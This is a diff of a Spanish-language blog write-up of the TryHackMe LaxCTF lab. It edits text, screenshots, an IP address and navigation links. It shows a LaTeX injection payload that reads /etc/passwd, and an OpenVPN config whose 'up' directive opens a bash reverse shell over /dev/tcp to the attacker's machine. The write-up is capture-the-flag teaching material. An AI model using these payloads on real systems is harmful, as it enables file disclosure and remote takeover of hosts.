@@ -1759,7 +1759,7 @@ C^
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="s2">&#34;(input|include|write18|immediate)&#34;</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Por lo que no es posible utilizar los &ldquo;comandos&rdquo; conocidos. Encontramos un PoC en <a href="https://www.exploit-db.com/exploits/8297"><strong>Moodle &lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure</strong></a> donde indica como es posible leer archivos a traves del siguiente payload:</p>
+</div><p>Por lo que no es posible utilizar los &ldquo;comandos&rdquo; conocidos. Probamos diferentes combinaciones pero ninguna de estas combinaciones funcionó. Reallizamos una busqueda de un posible <code>exploit</code> en google y encontramos un PoC en <a href="https://www.exploit-db.com/exploits/8297"><strong>Moodle &lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure</strong></a> donde indica como es posible leer archivos a traves del siguiente payload:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1768,7 +1768,8 @@ C^
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="s2">&#34;</span><span class="nv">$$</span><span class="s2"> \input{/etc/passwd} </span><span class="nv">$$</span><span class="s2">&#34;</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Logramos leer el archivo e incrustarlo en el PDF:<br />
+</div><p><img src="/images/posts/thm/laxctf/Screenshot_20200803_223810.png" alt="image" /></p>
+<p>Logramos leer el archivo e incrustarlo en el PDF:<br />
 <img src="/images/posts/thm/laxctf/Screenshot_20200729_191439.png" alt="image" /></p>
 <p>Además, dentro de la respuesta al enviar el PoC encontramos el contenido del archivo <code>/etc/passwd</code> con la informacion desordenada, donde logramos ver uno de los usuarios con su directorio principal y una carpeta no muy comun dentro de este archivo. Uno de los usuarios es <code>Lax</code> o <code>king</code> (Lax puede referirse al hostname) y su carpeta principal se encuentra en <code>/home/king</code>, el otro directorio es <code>/opt/secret</code>.<br />
 <img src="/images/posts/thm/laxctf/Screenshot_20200729_192158.png" alt="image" /></p>
@@ -1812,7 +1813,7 @@ g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+H
 <h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
 <p>Hacemos una pequeña enumeracion con <code>pspy</code> y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (<code>run.sh</code>).<br />
 <img src="/images/posts/thm/laxctf/Screenshot_20200729_204315.png" alt="image" /></p>
-<p>En el directorio principal de <code>king</code> encontramos un archivo <code>ovpn</code> por lo que agregamos una shell inversa al igual que en <a href="https://sckull.github.io/posts/vault/"><strong>VAULT - HTB</strong></a> esperando a alguna conexion a nuestra maquina..</p>
+<p>En el directorio principal de <code>king</code> encontramos un archivo <code>ovpn</code> por lo que agregamos una shell inversa al igual que en <a href="https://sckull.github.io/posts/vault/"><strong>VAULT - HTB</strong></a> esperando a alguna conexion a nuestra maquina.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1822,7 +1823,7 @@ g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+H
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">remote 192.168.122.4
+<pre class="chroma"><code class="language-bash" data-lang="bash">remote 10.10.90.68
 dev tun
 nobind
 script-security <span class="m">2</span>
@@ -1840,7 +1841,8 @@ up <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.1
 <pre class="chroma"><code class="language-bash" data-lang="bash">openvpn /home/king/tryhackme.ovpn
 </code></pre></td></tr></table>
 </div>
-</div>
+</div><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection"><strong>Payloads - Latex Injection</strong></a></p>
+
     </article>
     
     <script>
@@ -2039,6 +2041,10 @@ up <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.1
     <ul class="related-ul">
         
         <li>
+          <a href="/posts/bountyhacker/" class="related__link">TryHackMe - Bounty Hacker</a>
+        </li>
+        
+        <li>
           <a href="/posts/brooklyn99/" class="related__link">TryHackMe - Brooklyn Nine Nine</a>
         </li>
         
@@ -2047,15 +2053,11 @@ up <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.1
         </li>
         
         <li>
+          <a href="/posts/djinn/" class="related__link">TryHackMe - djinn</a>
+        </li>
+        
+        <li>
           <a href="/posts/blog/" class="related__link">TryHackMe - Blog</a>
-        </li>
-        
-        <li>
-          <a href="/posts/joystick/" class="related__link">TryHackMe - JoyStick</a>
-        </li>
-        
-        <li>
-          <a href="/posts/overpass/" class="related__link">TryHackMe - Overpass</a>
         </li>
         
     </ul>
@@ -2074,8 +2076,8 @@ up <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.1
     
     <div class="grow"></div>
     
-      <a href="https://sckull.github.io/posts/brooklyn99/" class="pagination-single__right">      
-        <div class="pagination-single__right-title">TryHackMe - Brooklyn Nine Nine</div>
+      <a href="https://sckull.github.io/posts/djinn/" class="pagination-single__right">      
+        <div class="pagination-single__right-title">TryHackMe - djinn</div>
         <div class="pagination-single__icon">
           <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
         </div>
